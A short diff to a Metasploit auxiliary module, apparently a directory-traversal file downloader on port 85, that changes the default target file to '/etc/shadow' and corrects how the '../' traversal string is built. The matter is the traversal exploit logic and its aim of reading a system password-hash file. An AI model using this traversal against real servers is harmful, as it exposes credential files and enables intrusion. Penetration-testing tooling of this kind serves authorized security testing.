@@ -37,7 +37,7 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(85),
-				OptString.new('FILEPATH', [false, 'The name of the file to download', 'etc/shadow']),
+				OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/shadow']),
 				OptInt.new('DEPTH', [true, 'Traversal depth', 10])
 			], self.class)
 	end
@@ -50,6 +50,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		travs = "../" * datastore['DEPTH']
+		travs = travs[0,travs.rindex('/')]
 
 		# Create request
 		res = send_request_raw({
